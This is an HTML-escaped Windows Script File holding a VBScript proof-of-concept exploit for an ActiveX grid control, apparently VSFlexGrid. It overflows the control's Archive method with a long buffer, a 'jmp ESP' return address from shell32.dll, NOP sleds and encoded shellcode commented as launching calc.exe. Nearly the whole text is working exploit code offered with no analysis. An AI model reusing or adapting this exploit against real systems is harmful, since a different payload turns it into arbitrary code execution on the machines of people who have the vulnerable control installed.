&lt;package&gt;
         &lt;job id=&#039;vsflex8l&#039; debug=&#039;false&#039; error=&#039;true&#039;&gt;
          &lt;object classid=&#039;clsid:C945E31A-102E-4A0D-8854-D599D7AED5FA&#039; id=&#039;vsFlexGrid&#039;/&gt;
           &lt;script language=&#039;vbscript&#039;&gt;
            buff      = String(268, &quot;A&quot;)
        
            get_EIP   = unescape(&quot;%81%69%A8%7C&quot;) &#039;jmp ESP from shell32.dll
        
            nop       = String(12, unescape(&quot;%90&quot;))
        
            &#039;execute calc.exe
        
            shellcode = shellcode + unescape(&quot;%eb%03%59%eb%05%e8%f8%ff%ff%ff%4f%49%49%49%49%49&quot;)
            shellcode = shellcode + unescape(&quot;%49%51%5a%56%54%58%36%33%30%56%58%34%41%30%42%36&quot;)
            shellcode = shellcode + unescape(&quot;%48%48%30%42%33%30%42%43%56%58%32%42%44%42%48%34&quot;)
            shellcode = shellcode + unescape(&quot;%41%32%41%44%30%41%44%54%42%44%51%42%30%41%44%41&quot;)
            shellcode = shellcode + unescape(&quot;%56%58%34%5a%38%42%44%4a%4f%4d%4e%4f%4a%4e%46%54&quot;)
            shellcode = shellcode + unescape(&quot;%42%30%42%50%42%50%4b%58%45%54%4e%53%4b%58%4e%37&quot;)
            shellcode = shellcode + unescape(&quot;%45%50%4a%47%41%30%4f%4e%4b%38%4f%44%4a%51%4b%48&quot;)
            shellcode = shellcode + unescape(&quot;%4f%55%42%42%41%30%4b%4e%49%44%4b%48%46%43%4b%38&quot;)
            shellcode = shellcode + unescape(&quot;%41%30%50%4e%41%53%42%4c%49%49%4e%4a%46%58%42%4c&quot;)
            shellcode = shellcode + unescape(&quot;%46%57%47%50%41%4c%4c%4c%4d%50%41%30%44%4c%4b%4e&quot;)
            shellcode = shellcode + unescape(&quot;%46%4f%4b%53%46%35%46%32%46%30%45%37%45%4e%4b%48&quot;)
            shellcode = shellcode + unescape(&quot;%4f%35%46%32%41%50%4b%4e%48%56%4b%38%4e%50%4b%54&quot;)
            shellcode = shellcode + unescape(&quot;%4b%48%4f%55%4e%31%41%30%4b%4e%4b%38%4e%41%4b%38&quot;)
            shellcode = shellcode + unescape(&quot;%41%30%4b%4e%49%58%4e%35%46%42%46%50%43%4c%41%43&quot;)
            shellcode = shellcode + unescape(&quot;%42%4c%46%36%4b%48%42%34%42%33%45%38%42%4c%4a%37&quot;)
            shellcode = shellcode + unescape(&quot;%4e%30%4b%48%42%34%4e%50%4b%48%42%57%4e%31%4d%4a&quot;)
            shellcode = shellcode + unescape(&quot;%4b%38%4a%46%4a%50%4b%4e%49%50%4b%48%42%38%42%4b&quot;)
            shellcode = shellcode + unescape(&quot;%42%30%42%50%42%30%4b%48%4a%36%4e%53%4f%35%41%33&quot;)
            shellcode = shellcode + unescape(&quot;%48%4f%42%46%48%35%49%58%4a%4f%43%48%42%4c%4b%57&quot;)
            shellcode = shellcode + unescape(&quot;%42%55%4a%46%42%4f%4c%48%46%50%4f%35%4a%46%4a%49&quot;)
            shellcode = shellcode + unescape(&quot;%50%4f%4c%38%50%30%47%55%4f%4f%47%4e%43%56%41%36&quot;)
            shellcode = shellcode + unescape(&quot;%4e%46%43%46%50%52%45%36%4a%37%45%36%42%30%5a&quot;)
        
            egg       = buff + get_EIP + nop + shellcode + nop
        
            vsFlexGrid.Archive egg, &quot;something&quot;, 1
           &lt;/script&gt;
          &lt;/job&gt;
        &lt;/package&gt;
        
        